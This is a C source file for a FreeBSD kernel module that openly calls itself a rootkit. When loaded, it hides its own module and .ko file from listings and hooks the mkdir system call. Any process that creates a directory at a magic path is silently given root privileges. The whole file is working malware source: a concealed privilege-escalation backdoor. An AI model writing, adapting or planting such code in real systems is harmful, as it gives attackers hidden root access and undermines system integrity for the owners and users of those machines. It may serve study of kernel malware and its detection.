/*
 * Copyright (c) 2019 Jasper Lowell
 * Copyright (c) 2019 Wesley Hamburger
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "config.h"
#include "debug.h"
#include "privilege.h"
#include "hook.h"
#include "hide.h"

#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>

static int mkdir_hook(struct thread *td, void *syscall_args);

static int
load(struct module *module, int cmd, void *arg)
{
	switch(cmd)
	{
		case MOD_LOAD:
			LOGI("[rootkit:load] Rootkit loaded.\n");
			hook_syscall_set(SYS_mkdir, mkdir_hook);
			hide_kld("rootkit");
			hide_ko("rootkit.ko");
			break;
		case MOD_UNLOAD:
			hook_syscall_set(SYS_mkdir, sys_mkdir);
			LOGI("[rootkit:load] Rootkit unloaded.\n");
			break;
		default:
			LOGE("[rootkit:load] Unsupported event: {%d}.\n", cmd);
			break;
	}

	return(0);
}

static int
mkdir_hook(struct thread *td, void *syscall_args) {
	struct mkdir_args *uap;
	uap = (struct mkdir_args *) syscall_args;

	char path[255];
	size_t done;
	int error;

	error = copyinstr(uap->path, path, 255, &done);

	if (error != 0)
	{
		return(error);
	}

	if (strcmp(path, RKIT_ELEVATE) == 0)
	{
		privilege_set(td, 0);
	}

	return(sys_mkdir(td, syscall_args));
}

static moduledata_t rootkit_mod = {
	MODULE_NAME,
	load,
	NULL
};

DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
